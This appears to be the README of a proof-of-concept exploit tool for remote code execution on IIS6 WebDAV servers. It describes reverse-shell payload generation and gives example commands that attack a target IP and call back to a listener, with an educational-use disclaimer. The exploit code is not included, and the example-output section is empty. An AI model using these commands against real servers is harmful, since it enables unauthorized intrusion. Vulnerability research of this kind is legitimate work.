**GenWebDavIISExploit** is a PoC tool demonstrating an exploit for a known vulnerability in the WebDAV component of IIS6. This tool is designed for educational and research purposes to showcase how the vulnerability can be leveraged to execute arbitrary code on a remote server.

## Disclaimer

This project is intended for **educational purposes only**. Use this tool responsibly and only on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.

## Features

- Remote code execution on vulnerable IIS6 WebDAV servers.
- Dynamic payload generation with user-specified reverse IP and port.
- Easy-to-use command-line interface for rapid exploitation.

## Prerequisites

- **Python 3.x**: Ensure that Python 3 is installed on your system.
- **Network Access**: Ability to connect to the target machine's IP and port.

## Usage
### Command-Line Arguments

- **Target IP**: The IP address of the target IIS6 WebDAV server.
- **Target Port**: The port number on which the WebDAV service is running (usually 80).
- **Reverse IP**: Your IP address where the reverse shell should connect.
- **Reverse Port**: The port number on your system to receive the reverse shell.

## Example

```bash
python3 GenWebDavIISExploit.py <target_ip> <target_port> <reverse_ip> <reverse_port>
```

## Usage Example

```bash
python3 GenWebDavIISExploit.py 192.168.1.10 80 192.168.1.5 4444
```

## Example output
```
$ python3 GenWebDavIISExploit.py 192.168.1.10 80 192.168.1.5 4444

## Notes
- Ensure you have a listener running on the specified reverse port to capture the incoming reverse shell.
- Use this tool only on authorized systems to test for vulnerabilities.
